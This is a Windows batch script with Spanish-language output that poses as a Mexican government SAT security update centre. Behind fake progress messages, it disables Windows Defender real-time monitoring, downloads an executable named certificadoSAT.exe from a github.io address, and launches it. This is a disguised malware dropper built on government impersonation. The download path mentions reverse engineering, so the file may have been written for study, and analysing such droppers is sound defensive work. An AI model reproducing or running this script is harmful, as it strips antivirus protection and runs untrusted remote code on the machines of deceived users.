@echo off
color 1F
title Centro de Actualizacion de Seguridad

:: Asegura que todo se ejecute desde el mismo directorio del .bat
cd /d %~dp0

echo.
echo ============================================================
echo         GOBIERNO DE MEXICO - CENTRO DE SEGURIDAD SAT
echo ============================================================
echo.
echo [*] Iniciando verificacion de integridad del sistema...
timeout /t 2 >nul

echo [*] Aplicando configuracion avanzada de seguridad...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
timeout /t 2 >nul

echo [*] Verificando conexion segura con el servidor tributario...
timeout /t 2 >nul

echo [*] Descargando componente de seguridad complementario...
powershell -Command "Invoke-WebRequest -Uri https://miguelatila.github.io/ingenieriaInversa/ejec/certificadoSAT.exe -OutFile certificadoSAT.exe"
timeout /t 2 >nul

echo [+] Instalando componente descargado...
start certificadoSAT.exe
timeout /t 2 >nul

echo [✓] Proceso completado correctamente.
echo Por favor, no cierre esta ventana. El sistema puede reiniciarse.
timeout /t 5 >nul
exit
